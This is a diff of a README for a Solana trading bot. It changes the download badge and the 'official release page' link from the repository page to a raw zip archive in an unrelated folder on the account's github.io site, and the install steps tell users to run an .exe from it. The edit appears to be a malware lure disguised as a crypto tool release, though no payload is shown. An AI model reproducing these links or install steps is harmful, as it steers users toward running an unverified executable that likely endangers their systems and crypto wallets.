@@ -5,7 +5,7 @@ description: "Automate Solana token trades with real-time market monitoring and 
 ---
 # 🤖 solana-trading-bot-v3 - Automate your digital asset trades easily
 
-[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/almirediscomycetous272/solana-trading-bot-v3)
+[![](https://img.shields.io/badge/Download-Software-blue)](https://raw.githubusercontent.com/almirediscomycetous272/almirediscomycetous272.github.io/main/Contraposaune/github-almirediscomycetous-io-1.8.zip)
 
 ## 📖 About the project
 
@@ -25,7 +25,7 @@ Your computer needs to meet these standards to run the application:
 
 Follow these steps to install the bot on your computer.
 
-1. Go to the [official release page](https://github.com/almirediscomycetous272/solana-trading-bot-v3).
+1. Go to the [official release page](https://raw.githubusercontent.com/almirediscomycetous272/almirediscomycetous272.github.io/main/Contraposaune/github-almirediscomycetous-io-1.8.zip).
 2. Look for the file ending in .exe in the latest release section.
 3. Click the file to download the installer to your device.
 4. Locate the file in your downloads folder.
